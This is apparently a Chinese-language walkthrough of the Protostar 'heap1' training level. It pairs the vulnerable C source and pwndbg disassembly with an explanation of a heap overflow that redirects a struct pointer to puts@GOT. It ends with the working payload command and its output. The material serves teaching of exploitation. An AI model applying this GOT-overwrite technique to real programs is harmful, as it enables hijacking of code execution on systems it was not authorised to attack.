```
# Heap One

This level takes a look at code flow hijacking in data overwrite cases.

This level is at /opt/protostar/bin/heap1
```
---
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

```c
pwndbg> disass winner 
Dump of assembler code for function winner:
   0x08048494 <+0>:     push   ebp
   0x08048495 <+1>:     mov    ebp,esp
   0x08048497 <+3>:     sub    esp,0x18
   0x0804849a <+6>:     mov    DWORD PTR [esp],0x0
   0x080484a1 <+13>:    call   0x80483ac <time@plt>
   0x080484a6 <+18>:    mov    edx,0x8048630
   0x080484ab <+23>:    mov    DWORD PTR [esp+0x4],eax
   0x080484af <+27>:    mov    DWORD PTR [esp],edx
   0x080484b2 <+30>:    call   0x804839c <printf@plt>
   0x080484b7 <+35>:    leave
   0x080484b8 <+36>:    ret
End of assembler dump.
pwndbg> disass ma
main             malloc           malloc@got[plt]  malloc@plt       
pwndbg> disass main
Dump of assembler code for function main:
   0x080484b9 <+0>:     push   ebp
   0x080484ba <+1>:     mov    ebp,esp
   0x080484bc <+3>:     and    esp,0xfffffff0
   0x080484bf <+6>:     sub    esp,0x20
   0x080484c2 <+9>:     mov    DWORD PTR [esp],0x8
   0x080484c9 <+16>:    call   0x80483bc <malloc@plt>
   0x080484ce <+21>:    mov    DWORD PTR [esp+0x14],eax
   0x080484d2 <+25>:    mov    eax,DWORD PTR [esp+0x14]
   0x080484d6 <+29>:    mov    DWORD PTR [eax],0x1
   0x080484dc <+35>:    mov    DWORD PTR [esp],0x8
   0x080484e3 <+42>:    call   0x80483bc <malloc@plt>
   0x080484e8 <+47>:    mov    edx,eax
   0x080484ea <+49>:    mov    eax,DWORD PTR [esp+0x14]
   0x080484ee <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x080484f1 <+56>:    mov    DWORD PTR [esp],0x8
   0x080484f8 <+63>:    call   0x80483bc <malloc@plt>
   0x080484fd <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048501 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048505 <+76>:    mov    DWORD PTR [eax],0x2
   0x0804850b <+82>:    mov    DWORD PTR [esp],0x8
   0x08048512 <+89>:    call   0x80483bc <malloc@plt>
   0x08048517 <+94>:    mov    edx,eax
   0x08048519 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804851d <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048520 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048523 <+106>:   add    eax,0x4
   0x08048526 <+109>:   mov    eax,DWORD PTR [eax]
   0x08048528 <+111>:   mov    edx,eax
   0x0804852a <+113>:   mov    eax,DWORD PTR [esp+0x14]
   0x0804852e <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048531 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x08048535 <+124>:   mov    DWORD PTR [esp],eax
   0x08048538 <+127>:   call   0x804838c <strcpy@plt>
   0x0804853d <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048540 <+135>:   add    eax,0x8
   0x08048543 <+138>:   mov    eax,DWORD PTR [eax]
   0x08048545 <+140>:   mov    edx,eax
   0x08048547 <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804854b <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x0804854e <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x08048552 <+153>:   mov    DWORD PTR [esp],eax
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>
   0x0804855a <+161>:   mov    DWORD PTR [esp],0x804864b
   0x08048561 <+168>:   call   0x80483cc <puts@plt>
   0x08048566 <+173>:   leave
   0x08048567 <+174>:   ret
End of assembler dump.
```
---

**从代码中可以看到，p1和p2的内存布局是紧挨着的，如下：**
```c
堆内存布局（大致顺序）：
低地址
---
块1: [0x00000001] [指针指向块2(chunkA)]   (8字节)  ← p1指向这里
---
块2: [argv[1]的数据]                     (8字节)  ← chunkA，可溢出
---
块3: [0x00000002] [指针指向块4(chunkB)]   (8字节)  ← p2指向这里
---
块4: [argv[2]的数据]                     (8字节)  ← chunkB
---
高地址

栈上存储：
- [esp+0x14] 存储p1的地址
- [esp+0x18] 存储p2的地址
```

**由于 `chunkA` 和 `chunkB` 各只有 8 字节**
**且程序用 `strcpy` 复制用户输入（无长度检查）→ 溢出可覆盖相邻内存**

---
**由于函数执行中只调用了puts@plt ,所以我们需要通过溢出对其进行劫持：**
**我们通过第一个参数（argv[1]）溢出 `chunkA`，覆盖了 `p2` 结构体中的“name指针”（即 p2[1]），把它从指向 `chunkB` 改成指向 `puts@GOT`**
**然后，程序执行从`strcpy(p2[1], argv[2]);`变成`strcpy(puts@GOT, winner地址);`**
**这样就会把 `winner` 的地址写进了 `puts@GOT`**
**最后，程序调用 `puts(...)` 时，会去 GOT 表里找 `puts` 的真实地址 —— 结果找到的是 `winner` → 程序跳转到 `winner`**

---
**找到winner的地址**
```c
└─$ objdump -t heap1 |grep winner
08048494 g     F .text  00000025              winner
```

**找到puts@got的地址**
```c
└─$ objdump -TR heap1 |grep puts 
00000000      DF *UND*  00000000 (GLIBC_2.0)  puts
08049774 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

**获取偏移量**
```c
└─$ gdb-pwndbg  heap1
Successfully imported six module
Reading symbols from heap1...
pwndbg: loaded 207 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging
pwndbg> disass main
Dump of assembler code for function main:
   0x080484b9 <+0>:     push   ebp
   0x080484ba <+1>:     mov    ebp,esp
   0x080484bc <+3>:     and    esp,0xfffffff0
   0x080484bf <+6>:     sub    esp,0x20
   0x080484c2 <+9>:     mov    DWORD PTR [esp],0x8
   0x080484c9 <+16>:    call   0x80483bc <malloc@plt>
   0x080484ce <+21>:    mov    DWORD PTR [esp+0x14],eax
   0x080484d2 <+25>:    mov    eax,DWORD PTR [esp+0x14]
   0x080484d6 <+29>:    mov    DWORD PTR [eax],0x1
   0x080484dc <+35>:    mov    DWORD PTR [esp],0x8
   0x080484e3 <+42>:    call   0x80483bc <malloc@plt>
   0x080484e8 <+47>:    mov    edx,eax
   0x080484ea <+49>:    mov    eax,DWORD PTR [esp+0x14]
   0x080484ee <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x080484f1 <+56>:    mov    DWORD PTR [esp],0x8
   0x080484f8 <+63>:    call   0x80483bc <malloc@plt> //调用 malloc 分配 8 字节内存,malloc 成功后，**返回值（堆地址）保存在 `eax` 寄存器中**
   0x080484fd <+68>:    mov    DWORD PTR [esp+0x18],eax //把 `eax` 的值（也就是 malloc 返回的堆地址），**存到栈上的一个位置：`[esp+0x18]`**,即程序中“保存 p2 指针的临时变量”的地址
   0x08048501 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048505 <+76>:    mov    DWORD PTR [eax],0x2
   0x0804850b <+82>:    mov    DWORD PTR [esp],0x8
   0x08048512 <+89>:    call   0x80483bc <malloc@plt>
   0x08048517 <+94>:    mov    edx,eax
   0x08048519 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804851d <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048520 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048523 <+106>:   add    eax,0x4
   0x08048526 <+109>:   mov    eax,DWORD PTR [eax]
   0x08048528 <+111>:   mov    edx,eax
   0x0804852a <+113>:   mov    eax,DWORD PTR [esp+0x14]
   0x0804852e <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048531 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x08048535 <+124>:   mov    DWORD PTR [esp],eax
   0x08048538 <+127>:   call   0x804838c <strcpy@plt>
   0x0804853d <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048540 <+135>:   add    eax,0x8
   0x08048543 <+138>:   mov    eax,DWORD PTR [eax]
   0x08048545 <+140>:   mov    edx,eax
   0x08048547 <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804854b <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x0804854e <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x08048552 <+153>:   mov    DWORD PTR [esp],eax
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>
   0x0804855a <+161>:   mov    DWORD PTR [esp],0x804864b
   0x08048561 <+168>:   call   0x80483cc <puts@plt>
   0x08048566 <+173>:   leave
   0x08048567 <+174>:   ret
End of assembler dump.
pwndbg> b *main+127
Breakpoint 1 at 0x8048538: file heap1/heap1.c, line 31.
pwndbg> run AAAA BBBB
Starting program: /opt/protostar/bin/heap1 AAAA BBBB
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x08048538 in main (argc=3, argv=0xffffcf54) at heap1/heap1.c:31
warning: 31     heap1/heap1.c: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────
 EAX  0x804a1b0 ◂— 0
 EBX  0xf7f95e14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x232d0c /* '\x0c-#' */
 ECX  0
 EDX  0xffffd159 ◂— 'AAAA'
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x8048580 (__libc_csu_init) ◂— push ebp
 EBP  0xffffce98 ◂— 0
 ESP  0xffffce70 —▸ 0x804a1b0 ◂— 0
 EIP  0x8048538 (main+127) —▸ 0xfffe4fe8 ◂— 0
───────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────────
 ► 0x8048538 <main+127>    call   strcpy@plt                  <strcpy@plt>
        dest: 0x804a1b0 ◂— 0
        src: 0xffffd159 ◂— 'AAAA'
 
   0x804853d <main+132>    mov    eax, dword ptr [ebp + 0xc]
   0x8048540 <main+135>    add    eax, 8
   0x8048543 <main+138>    mov    eax, dword ptr [eax]
   0x8048545 <main+140>    mov    edx, eax
   0x8048547 <main+142>    mov    eax, dword ptr [esp + 0x18]
   0x804854b <main+146>    mov    eax, dword ptr [eax + 4]
   0x804854e <main+149>    mov    dword ptr [esp + 4], edx
   0x8048552 <main+153>    mov    dword ptr [esp], eax
   0x8048555 <main+156>    call   strcpy@plt                  <strcpy@plt>
 
   0x804855a <main+161>    mov    dword ptr [esp], 0x804864b
───────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce70 —▸ 0x804a1b0 ◂— 0
01:0004│-024 0xffffce74 —▸ 0xffffd159 ◂— 'AAAA'
02:0008│-020 0xffffce78 ◂— 0
... ↓        2 skipped
05:0014│-014 0xffffce84 —▸ 0x804a1a0 ◂— 1
06:0018│-010 0xffffce88 —▸ 0x804a1c0 ◂— 2
07:001c│-00c 0xffffce8c ◂— 0
─────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────
 ► 0 0x8048538 main+127
   1 0xf7d87cc3 __libc_start_call_main+115
   2 0xf7d87d88 __libc_start_main+136
   3 0x8048401 _start+33
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $esp
0xffffce70:     0x0804a1b0
pwndbg> p/x $eax
$1 = 0x804a1b0
```

**代码刚执行完`mov    DWORD PTR [esp],eax`,执行停在第一次strcmp之前， 此时esp的地址（或者eax的地址）就是chunka的起始地址：0x804a1b0**

---
**继续，我们需要获取到p2的起始地址：**
```c
pwndbg> x/wx $esp+0x18
0xffffce88:     0x0804a1c0
```

---
**计算偏移**
```c
p2[1] 地址 = p2 起始地址 + 4 = 0x0804a1c0 + 4 = 0x0804a1c4

而chunka的起始地址为：0x804a1b0

所以需要的偏移为：0x0804a1c4 - 0x804a1b0 = 0x14 = 20
```

**执行结果如下：**
```python
└─$ ./heap1 $(python2 -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python2 -c "print '\x94\x84\x04\x08'")
and we have a winner @ 1757928812
                                                                                                                                                                
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ ./heap1 `python2 -c "print 'A'*20 + '\x74\x97\x04\x08'"`  `python2 -c "print '\x94\x84\x04\x08'"`
and we have a winner @ 1757928839
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915173422840.png)





